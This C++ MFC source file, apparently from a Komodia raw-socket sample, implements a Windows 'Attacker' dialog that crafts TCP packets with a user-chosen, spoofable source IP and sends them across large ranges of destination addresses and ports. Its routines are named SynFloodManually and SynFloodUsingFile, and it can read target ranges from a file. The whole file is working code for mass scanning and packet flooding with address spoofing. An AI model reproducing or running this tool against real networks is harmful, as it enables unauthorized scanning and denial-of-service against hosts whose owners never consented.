// AttackerDlg.cpp : implementation file
//
/*
 *
 *
 *  Copyright (c) 2000 Barak Weichselbaum <barak@komodia.com>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *
 * Contact info:
 * Site: http://www.komodia.com
 * Email: barak@komodia.com
 */

#include "stdafx.h"
#include "Attacker.h"
#include "AttackerDlg.h"

#include "SpoofSocket.h"
#include "UDPSocket.h"
#include "TCPCrafter.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About


BOOL CAttackerDlg::m_bStop = FALSE;
CCriticalSection	CAttackerDlg::m_critStop;

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAttackerDlg dialog

CAttackerDlg::CAttackerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CAttackerDlg::IDD, pParent)
{
	//Seed the random-number generator with current time so that
	//the numbers will be different every time we run.
   	srand( (unsigned)time( NULL ) );
	//{{AFX_DATA_INIT(CAttackerDlg)
	m_TcpOptions = TRUE;
	m_nNumOfIPToCheck = 65536;
	m_bIPReverse = FALSE;
	m_nDelayInMiliSecondPer1016 = 20;
	m_sImportFileName = _T("");
	m_nIPChecked = _T("");
	m_bManually = -1;
	m_sPortToCheck = _T("1080");
	m_nNumOfIPPerSend = 30;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	initIPs();
}

void CAttackerDlg::DoDataExchange(CDataExchange* pDX)
{

	m_bManually = 0;
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAttackerDlg)
	DDX_Control(pDX, IDC_DESTIP, m_DestIP);
	DDX_Control(pDX, IDC_SOURCEIP, m_SourceIP);
	DDX_Text(pDX, IDC_EDIT_numtocheck, m_nNumOfIPToCheck);
	DDX_Check(pDX, IDC_CHECKipreverse, m_bIPReverse);
	DDX_Text(pDX, IDC_EDIT_delay, m_nDelayInMiliSecondPer1016);
	DDV_MinMaxLong(pDX, m_nNumOfIPToCheck, 1, 65536l /2 * 65535l + (65536 / 2 - 1));
	DDV_MinMaxInt(pDX, m_nDelayInMiliSecondPer1016, 0, 10000);
	DDX_Text(pDX, IDC_EDIT_filename, m_sImportFileName);
	DDV_MaxChars(pDX, m_sImportFileName, 128);
	DDX_Text(pDX, IDC_STATIC_ipnum, m_nIPChecked);
	DDV_MaxChars(pDX, m_nIPChecked, 15);
	DDX_Radio(pDX, IDC_RADIOmanual, m_bManually);
	DDX_Text(pDX, IDC_EDIT_porttocheck, m_sPortToCheck);
	DDV_MaxChars(pDX, m_sPortToCheck, 128);
	DDX_Text(pDX, IDC_EDIT_ips_per_send, m_nNumOfIPPerSend);
	DDV_MinMaxInt(pDX, m_nNumOfIPPerSend, 1, 4096);
	//}}AFX_DATA_MAP
	if (m_SourceIP.IsBlank())
	{
		m_SourceIP.SetAddress(m_nSourceIP1, m_nSourceIP2, m_nSourceIP3, m_nSourceIP4);
	}
	if (m_DestIP.IsBlank())
	{
		m_DestIP.SetAddress(m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
	}
	OnRADIOmanual() ;

}

BEGIN_MESSAGE_MAP(CAttackerDlg, CDialog)
	//{{AFX_MSG_MAP(CAttackerDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_SEND, OnSend)
	ON_BN_CLICKED(IDQuit, OnQuit)
	ON_BN_CLICKED(IDC_RADIOmanual, OnRADIOmanual)
	ON_BN_CLICKED(IDC_RADIOfile, OnRADIOfile)
	ON_BN_CLICKED(IDC_BUTTONbrowse, OnBUTTONbrowse)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAttackerDlg message handlers

BOOL CAttackerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CAttackerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CAttackerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CAttackerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CAttackerDlg::OnSend() 
{
	CStatic *pIPNum = (CStatic*)(CStatic *)(this->GetDlgItem(IDC_STATIC_ipnum));
	CStatic *pPort = (CStatic*)(CStatic *)(this->GetDlgItem(IDC_STATIC_port));
	char *msg = new char[16];

	//Invalidate (get all data)
	if (UpdateData(TRUE))
	{
		//scan
		BYTE dip1, dip2, dip3, dip4;
		m_DestIP.GetAddress(dip1, dip2, dip3, dip4);


//		int porttocheck = 0;
		CString sport;
		CString sports = m_sPortToCheck;
		sports.TrimLeft();
		sports.TrimRight();
		int index = -1;

		while (sports.GetLength() > 0)
		{
			pIPNum->SetWindowText("0");
			index = sports.Find(" ");
			if (index > 0)
			{
				sport = sports.Left(index);
				sports = sports.Right(sports.GetLength() - index);
				sports.TrimLeft();
			}
			else
			{
				sport = sports;
				sports = "";
			}
			m_nCurrentDestPort = atoi(sport);
			wsprintf(msg, "%d", m_nCurrentDestPort);
			pPort->SetWindowText(msg);

			m_nDestIP1 = dip1;
			m_nDestIP2 = dip2; 
			m_nDestIP3 = dip3; 
			m_nDestIP4 = dip4;

			if (m_bManually == 0)
			{
				SynFloodManually(m_nCurrentDestPort);
			}
			else if (m_bManually == 1)
			{
				SynFloodUsingFile(m_nCurrentDestPort);
			}
			Sleep(2000);
		}
	}
	delete msg;
}

void CAttackerDlg::OnQuit() 
{
	//quit
	EndDialog(0);
}
 
void CAttackerDlg::SynFloodManually(int porttocheck)
{
	//Create the tcp socket
	CTCPCrafter* tcp;
	tcp=new CTCPCrafter();
	CStatic *pIPNum = (CStatic*)(CStatic *)(this->GetDlgItem(IDC_STATIC_ipnum));
	char *msg = new char[16];
	unsigned long numIPChecked = 0;

	wsprintf(msg, "%d", 0);
	pIPNum->SetWindowText(msg);

//	m_DestIP.GetAddress(m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
	m_SourceIP.GetAddress(m_nSourceIP1, m_nSourceIP2, m_nSourceIP3, m_nSourceIP4);

	if (m_bIPReverse == TRUE)
	{
		m_nCurrentIP = m_nDestIP4 * 16777216 + m_nDestIP3 * 65536 
			+ m_nDestIP2 * 256 + m_nDestIP1;
	}
	else
	{
		m_nCurrentIP = m_nDestIP1 * 16777216 + m_nDestIP2 * 65536 
			+ m_nDestIP3 * 256 + m_nDestIP4;
	}

	//Was an error
	BOOL bError=TRUE;
	tcp->SetRaw(TRUE);
	if (tcp->Create())
	{
		bError=FALSE;
		//Set the source IP
		char* cSourceIP;
		char* cDestinationIP;
		cSourceIP=IPCtrlToSTR(&m_SourceIP);

		if (!cSourceIP)
		{
			//Error
			AfxMessageBox(ERROR_INVALID_SOURCE);
		}
		else
		{
			//Copy source IP
			cSourceIP=_strdup(cSourceIP);

			bError=TRUE;

			//Let's send
			tcp->SetSourceAddress(cSourceIP);
			tcp->Bind(cSourceIP);

			//Check if allowing TCP options
			if (m_TcpOptions)
			{
				tcp->SetTCPOptions(TRUE);
				//the following options cannot be used at the same time.
//				tcp->GetTCPOptions()->AddOption_Nothing();
//				tcp->GetTCPOptions()->AddOption_ENDLIST();
				tcp->GetTCPOptions()->AddOption_SegmentSize(0x05b4);
			}

			tcp->SetFlags(TCPFlag_RST);
			tcp->SetTTL(111);
			cDestinationIP = new char[16];
			unsigned short nSourcePort;

			numIPChecked = 0;
			nSourcePort = 1024;
			while (numIPChecked < m_nNumOfIPToCheck)
			{
				numIPChecked++;
				if (generateNextIP())
				{
					bError=TRUE;
					nSourcePort++;
					int randnum = rand();
					nSourcePort = nSourcePort % 64509 + 1025;
					tcp->SetSequenceNumber(randnum * randnum);
					wsprintf(cDestinationIP, "%d.%d.%d.%d", m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
					//check port 
					if (tcp->Connect(nSourcePort, cDestinationIP, porttocheck)) 
					{
						//OK
						bError=FALSE;
					}
					if ((numIPChecked % (m_nNumOfIPPerSend * 1) == 0) && (numIPChecked > 0))
					{
						//show num of ip checked periodically
						wsprintf(msg, "%d", numIPChecked);
						pIPNum->SetWindowText(msg);
						m_DestIP.SetAddress(m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
						m_DestIP.UpdateWindow();
						if (m_nDelayInMiliSecondPer1016 > 0)
						{
							Sleep(m_nDelayInMiliSecondPer1016); //delay for a while
						}
					}
				}
			}
			saveIPs();
			wsprintf(msg, "%d", numIPChecked);
			pIPNum->SetWindowText(msg);
			m_DestIP.SetAddress(m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
			m_DestIP.UpdateWindow();
			delete cSourceIP;
			delete cDestinationIP;
		}
	}

	if (bError)
		//Display error
		DisplaySocketError(tcp);

	tcp->Close();
	delete tcp;
	delete msg;
}

void CAttackerDlg::SynFloodUsingFile(int porttocheck)
{
	//Create the tcp socket
	CTCPCrafter* tcp;
	tcp=new CTCPCrafter();
	CStatic *pIPNum = (CStatic*)(CStatic *)(this->GetDlgItem(IDC_STATIC_ipnum));
	char *msg = new char[32];
	unsigned long numIPChecked = 0;
	unsigned long numIPCheckedTotally = 0;

	wsprintf(msg, "%d", 0);
	pIPNum->SetWindowText(msg);

	m_SourceIP.GetAddress(m_nSourceIP1, m_nSourceIP2, m_nSourceIP3, m_nSourceIP4);
	m_bIPReverse = FALSE;

	//Was an error
	BOOL bError=TRUE;
	tcp->SetRaw(TRUE);
	if (tcp->Create())
	{
		bError=FALSE;
		//Set the source IP
		char* cSourceIP;
		char* cDestinationIP;
		cSourceIP=IPCtrlToSTR(&m_SourceIP);

		if (!cSourceIP)
		{
			//Error
			AfxMessageBox(ERROR_INVALID_SOURCE);
		}
		else
		{
			//Copy source IP
			cSourceIP=_strdup(cSourceIP);

			bError=TRUE;

			//Let's send
			tcp->SetSourceAddress(cSourceIP);
			tcp->Bind(cSourceIP);

			//Check if allowing TCP options
			if (m_TcpOptions)
			{
				tcp->SetTCPOptions(TRUE);
				//the following options cannot be used at the same time.
//				tcp->GetTCPOptions()->AddOption_Nothing();
//				tcp->GetTCPOptions()->AddOption_ENDLIST();
				tcp->GetTCPOptions()->AddOption_SegmentSize(0x05b4);
			}

			tcp->SetFlags(TCPFlag_RST);
			tcp->SetTTL(111);
			cDestinationIP = new char[16];
			unsigned short nSourcePort;
			
			//read each line from the import file
			CStdioFile file(m_sImportFileName, CFile::modeRead);
			CString ip;
			while (file.ReadString(ip))
			{
				if (ip.Find('#') != 0)
				{
					//parse start destination ip
					CString startIP = ip.Left(ip.Find('-'));
					startIP.TrimLeft();
					startIP.TrimRight();
					int dot1 = startIP.Find('.');
					int dot2 = startIP.Find('.', dot1 + 1);
					int dot3 = startIP.Find('.', dot2 + 1);

					CString sip1 = startIP.Left(dot1);
					CString sip2 = startIP.Mid(dot1 + 1, dot2 - dot1 - 1);
					CString sip3 = startIP.Mid(dot2 + 1, dot3 - dot2 - 1);
					CString sip4 = startIP.Right(startIP.GetLength() - dot3 - 1);

					m_nDestIP1 = atoi(sip1);
					m_nDestIP2 = atoi(sip2);
					m_nDestIP3 = atoi(sip3);
					m_nDestIP4 = atoi(sip4);

					//parse end destination ip
					CString endIP = ip.Right(ip.GetLength() - ip.Find('-') - 1);
					endIP.TrimLeft();
					endIP.TrimRight();

					numIPChecked = 0;
	//				nSourcePort = 1024;
					m_nCurrentIP = m_nDestIP1 * 16777216 + m_nDestIP2 * 65536 
						+ m_nDestIP3 * 256 + m_nDestIP4;
					m_nNumOfIPToCheck = atol(endIP);
					while (numIPChecked < m_nNumOfIPToCheck)
					{
						numIPChecked++;
						numIPCheckedTotally++;
						if (generateNextIP())
						{
							bError=TRUE;
							nSourcePort++;
							int randnum = rand();
							int rand2 = rand() % 2 + 1;
							nSourcePort = (randnum * rand2) % 64509 + 1025;
							tcp->SetSequenceNumber(randnum * randnum);
							wsprintf(cDestinationIP, "%d.%d.%d.%d", m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
							//check port 
							if (tcp->Connect(nSourcePort, cDestinationIP, porttocheck)) 
							{
								//OK
								bError=FALSE;
							}
							if ((numIPChecked % (m_nNumOfIPPerSend * 1) == 0) && (numIPChecked > 0))
							{
								//show num of ip checked periodically
								wsprintf(msg, "%d - %d", numIPChecked, numIPCheckedTotally);
								pIPNum->SetWindowText(msg);
								m_DestIP.SetAddress(m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
								m_DestIP.UpdateWindow();
								if (m_nDelayInMiliSecondPer1016 > 0)
								{
									Sleep(m_nDelayInMiliSecondPer1016); //delay for a while
								}
							}
						}
					}
					saveIPs();
					wsprintf(msg, "%d - %d", numIPChecked, numIPCheckedTotally);
					pIPNum->SetWindowText(msg);
					m_DestIP.SetAddress(m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
					m_DestIP.UpdateWindow();
					Sleep(m_nDelayInMiliSecondPer1016); //delay for a while
				}
			}
			wsprintf(msg, "%d - %d", numIPCheckedTotally, numIPCheckedTotally);
			pIPNum->SetWindowText(msg);
			m_DestIP.SetAddress(m_nDestIP1, m_nDestIP2, m_nDestIP3, m_nDestIP4);
			m_DestIP.UpdateWindow();
			file.Close();
			delete cSourceIP;
			delete cDestinationIP;
		}
	}

	if (bError)
	{
		//Display error
		DisplaySocketError(tcp);
	}
	tcp->Close();
	delete tcp;
	delete msg;
	OnRADIOfile();
}

void CAttackerDlg::DisplaySocketError(CSpoofSocket *sock)
{
	//Display an error
	char* cErr;
	cErr=new char[10];
	itoa(sock->GetLastError(),cErr,10);

	char* cMsg;
	cMsg=new char[40];
	strcpy(cMsg,"Winsock error : ");
	strcat(cMsg,cErr);

	AfxMessageBox(cMsg);

	delete cMsg;
	delete cErr;
}

LPSTR CAttackerDlg::IPCtrlToSTR(CIPAddressCtrl* ctrl)
{
	//Converts the control address to textual address
	//Convert bytes to string
	BYTE bOctet1;
	BYTE bOctet2;
	BYTE bOctet3;
	BYTE bOctet4;

	//Get the value and blank values
	int iBlank;
	iBlank=ctrl->GetAddress(bOctet1,bOctet2,bOctet3,bOctet4);

	if (iBlank!=4)
		//Not filled
		return NULL;
	else
	{
		in_addr iAddr;
		iAddr.S_un.S_un_b.s_b1=bOctet1;
		iAddr.S_un.S_un_b.s_b2=bOctet2;
		iAddr.S_un.S_un_b.s_b3=bOctet3;
		iAddr.S_un.S_un_b.s_b4=bOctet4;

		return inet_ntoa(iAddr);
	}
}


void CAttackerDlg::initIPs()
{
	CStdioFile *f;
	TRY
	{
		f = new CStdioFile( "SYNSender.conf", 
			CFile::typeText | CFile::modeReadWrite);
	}
	CATCH( CFileException, e )
	{
		//get local host ip

		//init destination ip
		m_nDestIP1 = 1;
		m_nDestIP2 = 0;
		m_nDestIP3 = 0;
		m_nDestIP4 = 1;
		m_nSourceIP1 = 111;
		m_nSourceIP2 = 111;
		m_nSourceIP3 = 111;
		m_nSourceIP4 = 111;

		return;
	}
	END_CATCH

	CString s;

	f->ReadString(s);
	m_nSourceIP1 = atoi(s);
	f->ReadString(s);
	m_nSourceIP2 = atoi(s);
	f->ReadString(s);
	m_nSourceIP3 = atoi(s);
	f->ReadString(s);
	m_nSourceIP4 = atoi(s);

	f->ReadString(s);
	m_nDestIP1 = atoi(s);
	f->ReadString(s);
	m_nDestIP2 = atoi(s);
	f->ReadString(s);
	m_nDestIP3 = atoi(s);
	f->ReadString(s);
	m_nDestIP4 = atoi(s);

	f->Close();
}

void CAttackerDlg::saveIPs()
{
	CStdioFile *f;
	TRY
	{
		f = new CStdioFile( "SYNSender.conf", 
			CFile::modeCreate | CFile::modeWrite);
	}
	CATCH( CFileException, e )
	{
		return;
	}
	END_CATCH

	if (m_bIPReverse)
	{
		m_nDestIP4 = m_nCurrentIP / 16777216;
		m_nDestIP3 = (m_nCurrentIP % 16777216) / 65536;
		m_nDestIP2 = (m_nCurrentIP % 65536) / 256;
		m_nDestIP1 = m_nCurrentIP % 256;
	}
	else
	{
		m_nDestIP1 = m_nCurrentIP / 16777216;
		m_nDestIP2 = (m_nCurrentIP % 16777216) / 65536;
		m_nDestIP3 = (m_nCurrentIP % 65536) / 256;
		m_nDestIP4 = m_nCurrentIP % 256;
	}

	char *msg = new char[32];
	wsprintf(msg, "%d%c%d%c%d%c%d%c%c", m_nSourceIP1, 10, m_nSourceIP2, 10, 
		m_nSourceIP3, 10, m_nSourceIP4, 10, 0);
	f->WriteString(msg);

	wsprintf(msg, "%d%c%d%c%d%c%d%c%c", m_nDestIP1, 10, m_nDestIP2, 10, 
		m_nDestIP3, 10, m_nDestIP4, 10, 0);
	f->WriteString(msg);

	
	f->WriteString("source ip1, ip2, ip3, ip4, then destination IP1, IP2, IP3, IP4");

	f->Close();
	delete msg;
}

BOOL CAttackerDlg::generateNextIP()
{
	BOOL bReturn = FALSE;

	if (m_bIPReverse)
	{
		m_nDestIP4 = m_nCurrentIP / 16777216;
		m_nDestIP3 = (m_nCurrentIP % 16777216) / 65536;
		m_nDestIP2 = (m_nCurrentIP % 65536) / 256;
		m_nDestIP1 = m_nCurrentIP % 256;
	}
	else
	{
		m_nDestIP1 = m_nCurrentIP / 16777216;
		m_nDestIP2 = (m_nCurrentIP % 16777216) / 65536;
		m_nDestIP3 = (m_nCurrentIP % 65536) / 256;
		m_nDestIP4 = m_nCurrentIP % 256;
	}

	bReturn = TRUE;

	/*
	if (m_nCurrentDestPort == 1080)
	{
		if ((m_nDestIP1 == 12)
				|| (m_nDestIP1 == 24)
				|| ((m_nDestIP1 >= 61) && (m_nDestIP1 <= 68))
				|| (m_nDestIP1 == 80)
				|| (m_nDestIP1 == 128)
				|| (m_nDestIP1 == 130)
				|| (m_nDestIP1 == 142)
				|| (m_nDestIP1 == 144)
				|| (m_nDestIP1 == 148)
				|| (m_nDestIP1 == 151)
				|| (m_nDestIP1 == 156)
				|| (m_nDestIP1 == 161)
				|| (m_nDestIP1 == 165)
				|| (m_nDestIP1 == 168)
				|| ((m_nDestIP1 >= 192) && (m_nDestIP1 <= 196))
				|| ((m_nDestIP1 >= 198) && (m_nDestIP1 <= 200))
				|| ((m_nDestIP1 >= 202) && (m_nDestIP1 <= 213))
				|| ((m_nDestIP1 >= 216) && (m_nDestIP1 <= 219)))
		{
			if (
				((m_nDestIP1 == 68) && (m_nDestIP2 == 13))
				|| ((m_nDestIP1 == 199) && (m_nDestIP2 == 17))
				|| ((m_nDestIP1 == 203) && (m_nDestIP2 == 92))
				|| ((m_nDestIP1 == 204) && (m_nDestIP2 == 77))
				|| ((m_nDestIP1 == 134) && (m_nDestIP2 == 29))
				)
			{
			}
			else
			{
				bReturn = TRUE;
			}
		}
	}
	else if (m_nCurrentDestPort == 25)
	{
		if ((m_nDestIP1 == 158)
				|| (m_nDestIP1 == 163)
				|| ((m_nDestIP1 >= 193) && (m_nDestIP1 <= 196))
				|| (m_nDestIP1 == 202)
				|| (m_nDestIP1 == 203)
				|| (m_nDestIP1 == 210)
				|| (m_nDestIP1 == 211)
				|| (m_nDestIP1 == 212)
				|| (m_nDestIP1 == 213)
				|| (m_nDestIP1 == 217)
				|| (m_nDestIP1 == 218)
				|| (m_nDestIP1 == 61)
				|| (m_nDestIP1 == 62)
				|| (m_nDestIP1 == 80)
			)
		{
			if (
				((m_nDestIP1 == 203) && (m_nDestIP2 == 92))
				)
			{
			}
			else
			{
				bReturn = TRUE;
			}
		}
	}
	else
	{
		if (
			(m_nDestIP1 == 12)
			|| ((m_nDestIP1 >= 61) && (m_nDestIP1 <= 66))
			|| (m_nDestIP1 == 80)
			|| (m_nDestIP1 == 130)
			|| (m_nDestIP1 == 140)
			|| (m_nDestIP1 == 143)
			|| (m_nDestIP1 == 147)
			|| (m_nDestIP1 == 148)
			|| (m_nDestIP1 == 159)
			|| (m_nDestIP1 == 163)
			|| (m_nDestIP1 == 168)
			|| (m_nDestIP1 == 169)
			|| ((m_nDestIP1 >= 192) && (m_nDestIP1 <= 196))
			|| (m_nDestIP1 == 198) 
			|| (m_nDestIP1 == 200)
			|| ((m_nDestIP1 >= 202) && (m_nDestIP1 <= 214))
			|| ((m_nDestIP1 >= 216) && (m_nDestIP1 <= 219))
			)
		{
			if (
				((m_nDestIP1 == 68) && (m_nDestIP2 == 13))
				|| ((m_nDestIP1 == 199) && (m_nDestIP2 == 17))
				|| ((m_nDestIP1 == 203) && (m_nDestIP2 == 92))
				|| ((m_nDestIP1 == 204) && (m_nDestIP2 == 77))
				|| ((m_nDestIP1 == 134) && (m_nDestIP2 == 29))
				)
			{
			}
			else
			{
				bReturn = TRUE;
			}
		}
	}
	*/

	m_nCurrentIP++;
	return bReturn;
}



void CAttackerDlg::OnRADIOmanual() 
{
	// TODO: Add your control notification handler code here
	
	m_DestIP.EnableWindow(TRUE);
	CEdit *numtoceck = (CEdit*)(CEdit *)(this->GetDlgItem(IDC_EDIT_numtocheck));
	numtoceck->EnableWindow(TRUE);
	CCheckListBox *reverse = (CCheckListBox*)(CCheckListBox *)(this->GetDlgItem(IDC_CHECKipreverse));
	reverse->EnableWindow(TRUE);

	CEdit *filename = (CEdit*)(CEdit *)(this->GetDlgItem(IDC_EDIT_filename));
	filename->EnableWindow(FALSE);
	CButton *browse = (CButton*)(CButton *)(this->GetDlgItem(IDC_BUTTONbrowse));
	browse->EnableWindow(FALSE);
}

void CAttackerDlg::OnRADIOfile() 
{
	// TODO: Add your control notification handler code here
	
	m_DestIP.EnableWindow(FALSE);
	CEdit *numtoceck = (CEdit*)(CEdit *)(this->GetDlgItem(IDC_EDIT_numtocheck));
	numtoceck->EnableWindow(FALSE);
	CCheckListBox *reverse = (CCheckListBox*)(CCheckListBox *)(this->GetDlgItem(IDC_CHECKipreverse));
	reverse->EnableWindow(FALSE);

	CEdit *filename = (CEdit*)(CEdit *)(this->GetDlgItem(IDC_EDIT_filename));
	filename->EnableWindow(TRUE);
	CButton *browse = (CButton*)(CButton *)(this->GetDlgItem(IDC_BUTTONbrowse));
	browse->EnableWindow(TRUE);

}

void CAttackerDlg::OnBUTTONbrowse() 
{
	// TODO: Add your control notification handler code here
	
	CFileDialog *file = new CFileDialog(TRUE);

	if (file->DoModal() == IDOK)
	{
		m_sImportFileName = file->GetPathName();
		CEdit *filename = (CEdit*)(CEdit *)(this->GetDlgItem(IDC_EDIT_filename));
		filename->SetWindowText(m_sImportFileName);
	}
}
